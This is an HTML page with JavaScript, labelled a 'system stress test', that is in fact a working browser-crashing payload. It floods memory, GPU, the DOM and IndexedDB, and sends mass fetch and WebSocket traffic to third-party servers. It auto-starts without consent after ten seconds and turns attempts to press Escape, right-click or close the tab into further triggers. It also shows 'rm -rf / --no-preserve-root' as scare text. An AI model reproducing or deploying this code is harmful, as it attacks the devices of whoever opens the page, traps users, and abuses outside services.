<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ULTIMATE SYSTEM STRESS TEST</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            cursor: none;
        }
        
        .warning {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background: #ff0000;
            color: #000;
            text-align: center;
            padding: 20px;
            font-size: 2rem;
            font-weight: bold;
            z-index: 10000;
            animation: blink 0.5s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        
        .terminal {
            position: fixed;
            top: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.9);
            border: 3px solid #ff0000;
            padding: 30px;
            width: 90%;
            max-width: 800px;
            box-shadow: 0 0 50px #ff0000;
        }
        
        .prompt {
            color: #00ff00;
            font-size: 1.5rem;
            margin-bottom: 20px;
        }
        
        .command {
            color: #ff0000;
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 30px;
        }
        
        #launchButton {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 25px 60px;
            font-size: 2rem;
            font-weight: bold;
            cursor: pointer;
            margin: 30px 0;
            animation: pulse 1s infinite;
            text-transform: uppercase;
            letter-spacing: 5px;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
            70% { transform: scale(1.1); box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
        }
        
        .counter {
            color: #ff0000;
            font-size: 3rem;
            margin: 20px 0;
            text-align: center;
        }
        
        .glitch {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj4KICA8ZGVmcz4KICAgIDxwYXR0ZXJuIGlkPSJwIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPgogICAgICA8cmVjdCB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIGZpbGw9IiNmMDAiLz4KICAgICAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjIwIiBoZWlnaHQ9IjIwIiBmaWxsPSIjMDAwIi8+CiAgICA8L3BhdHRlcm4+CiAgPC9kZWZzPgogIDxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjcCkiLz4KPC9zdmc+');
            opacity: 0.1;
            pointer-events: none;
            animation: shake 0.1s infinite;
        }
        
        @keyframes shake {
            0%, 100% { transform: translate(0, 0); }
            10%, 30%, 50%, 70%, 90% { transform: translate(-2px, -2px); }
            20%, 40%, 60%, 80% { transform: translate(2px, 2px); }
        }
        
        #crashStatus {
            color: #ff0000;
            font-size: 1.2rem;
            margin-top: 20px;
            height: 200px;
            overflow-y: auto;
            border: 1px solid #ff0000;
            padding: 10px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="warning">‚ö†Ô∏è CRITICAL SYSTEM OVERLOAD - DO NOT TOUCH ‚ö†Ô∏è</div>
    
    <canvas id="matrix"></canvas>
    <div class="glitch"></div>
    
    <div class="terminal">
        <div class="prompt">root@system:~# sudo rm -rf / --no-preserve-root</div>
        <div class="command">INITIATING SYSTEM MELTDOWN SEQUENCE...</div>
        
        <div class="counter" id="counter">MEMORY: 0 MB</div>
        
        <button id="launchButton" onclick="startNuclearMeltdown()">
            üî• LAUNCH NUCLEAR MELTDOWN üî•
        </button>
        
        <div id="crashStatus"></div>
    </div>

    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = "01„Ç¢„Ç§„Ç¶„Ç®„Ç™„Ç´„Ç≠„ÇØ„Ç±„Ç≥„Çµ„Ç∑„Çπ„Çª„ÇΩ„Çø„ÉÅ„ÉÑ„ÉÜ„Éà„Éä„Éã„Éå„Éç„Éé„Éè„Éí„Éï„Éò„Éõ„Éû„Éü„É†„É°„É¢„É§„É¶„É®„É©„É™„É´„É¨„É≠„ÉØ„É≤„É≥";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#0f0';
            ctx.font = `${fontSize}px monospace`;
            
            for(let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 33);
        
        // EXTREME CRASH FUNCTIONS
        const crashLog = document.getElementById('crashStatus');
        const counter = document.getElementById('counter');
        
        function log(message) {
            crashLog.innerHTML += `[${new Date().toISOString().split('T')[1].split('.')[0]}] ${message}<br>`;
            crashLog.scrollTop = crashLog.scrollHeight;
        }
        
        let totalMemory = 0;
        const allocatedArrays = [];
        const allocatedObjects = [];
        const allocatedStrings = [];
        
        // Level 1: Basic Memory Flood
        function memoryFlood() {
            log("LEVEL 1: Starting Memory Flood...");
            return new Promise(resolve => {
                const floodInterval = setInterval(() => {
                    try {
                        // Allocate huge arrays
                        for(let i = 0; i < 10; i++) {
                            const hugeArray = new ArrayBuffer(100 * 1024 * 1024); // 100MB each
                            const view = new Uint8Array(hugeArray);
                            for(let j = 0; j < view.length; j += 1000) {
                                view[j] = Math.random() * 256;
                            }
                            allocatedArrays.push(hugeArray);
                            totalMemory += 100;
                        }
                        
                        // Allocate huge strings
                        const hugeString = 'CRASH'.repeat(5000000); // ~25MB
                        allocatedStrings.push(hugeString);
                        totalMemory += 25;
                        
                        counter.textContent = `MEMORY: ${totalMemory} MB`;
                        
                        if(totalMemory > 1000) {
                            clearInterval(floodInterval);
                            resolve();
                        }
                    } catch(e) {
                        // Continue anyway
                    }
                }, 10);
            });
        }
        
        // Level 2: Stack Destruction
        function stackDestruction() {
            log("LEVEL 2: Initiating Stack Destruction...");
            
            // Recursive function with multiple branches
            function recursiveBomb(depth) {
                if(depth > 100000) return;
                
                // Allocate memory in each call
                const localArray = new Array(10000).fill({data: 'X'.repeat(1000)});
                allocatedObjects.push(localArray);
                
                // Multiple recursive calls
                recursiveBomb(depth + 1);
                recursiveBomb(depth + 1);
                recursiveBomb(depth + 1);
            }
            
            try {
                recursiveBomb(0);
            } catch(e) {
                log("Stack overflow detected!");
            }
        }
        
        // Level 3: GPU Destruction
        function gpuDestruction() {
            log("LEVEL 3: Starting GPU Meltdown...");
            
            const canvases = [];
            const workers = [];
            
            // Create 100 WebGL contexts
            for(let i = 0; i < 100; i++) {
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = 4096;
                    canvas.height = 4096;
                    document.body.appendChild(canvas);
                    canvases.push(canvas);
                    
                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                    if(gl) {
                        // Create large texture
                        const texture = gl.createTexture();
                        gl.bindTexture(gl.TEXTURE_2D, texture);
                        
                        const data = new Uint8Array(4096 * 4096 * 4);
                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
                    }
                } catch(e) {}
            }
            
            // GPU compute shaders
            for(let i = 0; i < 20; i++) {
                try {
                    const workerCode = `
                        const canvas = new OffscreenCanvas(256, 256);
                        const gl = canvas.getContext('webgl2');
                        const buffer = gl.createBuffer();
                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                        
                        while(true) {
                            const data = new Float32Array(1000000);
                            gl.bufferData(gl.ARRAY_BUFFER, data, gl.DYNAMIC_DRAW);
                            gl.drawArrays(gl.POINTS, 0, 1000000);
                        }
                    `;
                    const blob = new Blob([workerCode]);
                    const worker = new Worker(URL.createObjectURL(blob));
                    workers.push(worker);
                } catch(e) {}
            }
        }
        
        // Level 4: WebAssembly Memory Bomb
        function wasmBomb() {
            log("LEVEL 4: Deploying WebAssembly Memory Bomb...");
            
            // Create massive WebAssembly memory
            try {
                const memory = new WebAssembly.Memory({ 
                    initial: 65536, // 4GB initial
                    maximum: 65536 * 10 // 40GB maximum
                });
                
                // Fill memory
                const buffer = new Uint8Array(memory.buffer);
                const fillInterval = setInterval(() => {
                    for(let i = 0; i < buffer.length; i += 1000) {
                        buffer[i] = Math.random() * 256;
                    }
                    totalMemory += 4000; // 4GB per interval
                    counter.textContent = `MEMORY: ${totalMemory} MB`;
                }, 100);
                
                setTimeout(() => clearInterval(fillInterval), 5000);
            } catch(e) {}
        }
        
        // Level 5: DOM Apocalypse
        function domApocalypse() {
            log("LEVEL 5: Starting DOM Apocalypse...");
            
            // Create millions of DOM elements
            const fragment = document.createDocumentFragment();
            let elementCount = 0;
            
            const createElements = () => {
                for(let i = 0; i < 10000; i++) {
                    const div = document.createElement('div');
                    div.innerHTML = `
                        <div style="position:absolute;left:${Math.random()*100}vw;top:${Math.random()*100}vh">
                            ${'üí•'.repeat(100)}
                        </div>
                    `;
                    fragment.appendChild(div);
                    elementCount++;
                    
                    if(elementCount % 1000 === 0) {
                        document.body.appendChild(fragment.cloneNode(true));
                    }
                }
                
                if(elementCount < 1000000) {
                    setTimeout(createElements, 0);
                }
            };
            
            createElements();
        }
        
        // Level 6: Network Flood
        function networkFlood() {
            log("LEVEL 6: Initiating Network Flood...");
            
            // Flood with fetch requests
            for(let i = 0; i < 1000; i++) {
                fetch(`https://httpbin.org/delay/${Math.random() * 10}`)
                    .catch(() => {});
                
                // Create WebSocket connections
                try {
                    const ws = new WebSocket('wss://echo.websocket.org');
                    ws.onopen = () => {
                        setInterval(() => {
                            ws.send('X'.repeat(1000000));
                        }, 100);
                    };
                } catch(e) {}
            }
        }
        
        // Level 7: IndexedDB Bomb
        function indexedDBBomb() {
            log("LEVEL 7: Deploying IndexedDB Bomb...");
            
            for(let i = 0; i < 100; i++) {
                try {
                    const request = indexedDB.open(`crashDB_${i}`, 1);
                    
                    request.onupgradeneeded = function(event) {
                        const db = event.target.result;
                        const store = db.createObjectStore('crash', { keyPath: 'id' });
                        
                        // Store huge amounts of data
                        const transaction = db.transaction(['crash'], 'readwrite');
                        const objectStore = transaction.objectStore('crash');
                        
                        for(let j = 0; j < 10000; j++) {
                            objectStore.add({
                                id: j,
                                data: 'X'.repeat(10000),
                                timestamp: new Date().toISOString()
                            });
                        }
                    };
                } catch(e) {}
            }
        }
        
        // Level 8: Final System Meltdown
        function systemMeltdown() {
            log("LEVEL 8: FINAL SYSTEM MELTDOWN...");
            
            // Combine all methods at once
            const methods = [
                () => {
                    // Infinite loop with eval
                    eval(`
                        while(true) {
                            (function() {
                                return arguments.callee;
                            })()();
                        }
                    `);
                },
                () => {
                    // Crash with typed arrays
                    const arrays = [];
                    while(true) {
                        arrays.push(new Float64Array(10000000));
                    }
                },
                () => {
                    // Abuse garbage collector
                    const garbage = [];
                    setInterval(() => {
                        for(let i = 0; i < 1000; i++) {
                            garbage.push(new Array(1000000));
                        }
                        garbage.splice(0, garbage.length / 2);
                    }, 1);
                },
                () => {
                    // Browser API abuse
                    for(let i = 0; i < 1000; i++) {
                        audioContext = new (window.AudioContext || window.webkitAudioContext)();
                        analyser = audioContext.createAnalyser();
                        buffer = audioContext.createBuffer(2, 44100 * 10, 44100);
                    }
                }
            ];
            
            // Execute all methods simultaneously
            methods.forEach(method => {
                try {
                    method();
                } catch(e) {
                    // Ignore errors
                }
            });
            
            // Ultimate memory bomb
            const ultimateBomb = () => {
                const bomb = [];
                while(true) {
                    bomb.push(new ArrayBuffer(1024 * 1024 * 500)); // 500MB chunks
                    totalMemory += 500;
                    counter.textContent = `MEMORY: ${totalMemory} MB - SYSTEM FAILURE IMMINENT`;
                    
                    if(totalMemory > 10000) {
                        document.body.innerHTML = `
                            <div style="
                                position: fixed;
                                top: 0;
                                left: 0;
                                width: 100%;
                                height: 100%;
                                background: #000;
                                color: #f00;
                                font-size: 5rem;
                                display: flex;
                                align-items: center;
                                justify-content: center;
                                text-align: center;
                            ">
                                üí• SYSTEM DESTROYED üí•<br>
                                Browser will crash in 3... 2... 1...
                            </div>
                        `;
                    }
                }
            };
            
            setTimeout(ultimateBomb, 1000);
        }
        
        // Main function
        async function startNuclearMeltdown() {
            log("üöÄ NUCLEAR MELTDOWN SEQUENCE INITIATED üöÄ");
            document.getElementById('launchButton').disabled = true;
            document.getElementById('launchButton').textContent = "üí£ MELTDOWN IN PROGRESS üí£";
            
            try {
                await memoryFlood();
                await stackDestruction();
                await gpuDestruction();
                await wasmBomb();
                await domApocalypse();
                await networkFlood();
                await indexedDBBomb();
                await systemMeltdown();
            } catch(e) {
                log(`Error: ${e.message}`);
            }
            
            // Auto-start if no interaction
            setTimeout(() => {
                if(totalMemory < 1000) {
                    startNuclearMeltdown();
                }
            }, 5000);
        }
        
        // Auto-start after 10 seconds
        setTimeout(() => {
            if(!document.getElementById('launchButton').disabled) {
                log("AUTO-STARTING MELTDOWN IN 5 SECONDS...");
                setTimeout(startNuclearMeltdown, 5000);
            }
        }, 10000);
        
        // Prevent escape
        document.addEventListener('keydown', (e) => {
            e.preventDefault();
            if(e.key === 'Escape' || e.key === 'F5' || e.key === 'F12') {
                log("ESCAPE ATTEMPT DETECTED - ACCELERATING MELTDOWN");
                startNuclearMeltdown();
            }
        });
        
        // Right click prevention
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            startNuclearMeltdown();
        });
        
        // Attempt to close tab
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
            startNuclearMeltdown();
        });
    </script>
</body>
</html>
